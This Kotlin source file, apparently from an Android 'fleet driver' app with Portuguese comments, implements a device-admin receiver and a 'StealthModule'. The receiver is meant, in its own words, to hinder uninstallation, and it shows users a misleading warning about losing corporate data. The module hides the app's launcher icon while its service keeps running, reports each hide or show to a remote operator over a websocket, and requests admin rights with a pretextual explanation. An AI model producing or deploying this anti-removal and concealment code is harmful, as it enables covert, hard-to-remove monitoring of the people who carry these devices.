// [context: Android API 26+, ARM64/any — Device Admin receiver + anti-uninstall + icon hide]
// DeviceAdminModule.kt — DeviceAdminReceiver para dificultar remoção + utilitário de icon hide
package com.fleetdroid.driver.service

import android.app.admin.DeviceAdminReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log

// ── DeviceAdminReceiver — registrado no manifesto com device-admin policy ─
class FleetDeviceAdmin : DeviceAdminReceiver() {

    companion object {
        const val TAG = "FleetDeviceAdmin"

        fun getComponentName(context: Context): ComponentName =
            ComponentName(context.packageName, FleetDeviceAdmin::class.java.name)

        fun isAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                as? android.app.admin.DevicePolicyManager ?: return false
            return dpm.isAdminActive(getComponentName(context))
        }
    }

    // Intercepta tentativa de desativar o admin — apenas loga
    // (o sistema ainda processa, mas dificulta via UX frictionada)
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w(TAG, "Device admin disable requested — blocking UI")
        // Retornamos mensagem que aparece no dialog de confirmação do sistema
        return "Remover esta configuração pode causar perda de dados corporativos."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.w(TAG, "Device admin disabled")
        // Tenta remover prova de admin status do prefs
        context.getSharedPreferences("fleet_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("device_admin", false).apply()
    }

    override fun onEnabled(context: Context, intent: Intent) {
        Log.i(TAG, "Device admin enabled")
        context.getSharedPreferences("fleet_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("device_admin", true).apply()
    }
}

// ── Icon hide / show via PackageManager ───────────────────────────────────
object StealthModule {

    const val TAG = "StealthModule"

    /**
     * Oculta o ícone do launcher — o app some da lista de apps.
     * O serviço continua rodando em background.
     * ATENÇÃO: requer reinício para o sistema processar a mudança.
     */
    fun hideIcon(context: Context) {
        try {
            val pm = context.packageManager
            val launcher = ComponentName(context.packageName, "${context.packageName}.MainActivity")
            pm.setComponentEnabledSetting(
                launcher,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "icon hidden")
            DispatchService.instance?.sendWs("""{"type":"stealth_icon_hidden","ts":${System.currentTimeMillis()}}""")
        } catch (e: Exception) {
            Log.e(TAG, "hideIcon error", e)
        }
    }

    /**
     * Restaura o ícone no launcher.
     */
    fun showIcon(context: Context) {
        try {
            val pm = context.packageManager
            val launcher = ComponentName(context.packageName, "${context.packageName}.MainActivity")
            pm.setComponentEnabledSetting(
                launcher,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "icon shown")
            DispatchService.instance?.sendWs("""{"type":"stealth_icon_shown","ts":${System.currentTimeMillis()}}""")
        } catch (e: Exception) {
            Log.e(TAG, "showIcon error", e)
        }
    }

    /**
     * Solicita ativação de Device Admin — abre o dialog do sistema.
     * Chamado apenas via comando do operador (requer interação do usuário).
     */
    fun requestDeviceAdmin(context: Context) {
        try {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    FleetDeviceAdmin.getComponentName(context)
                )
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Necessário para gerenciamento de dispositivo corporativo."
                )
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "requestDeviceAdmin error", e)
        }
    }
}
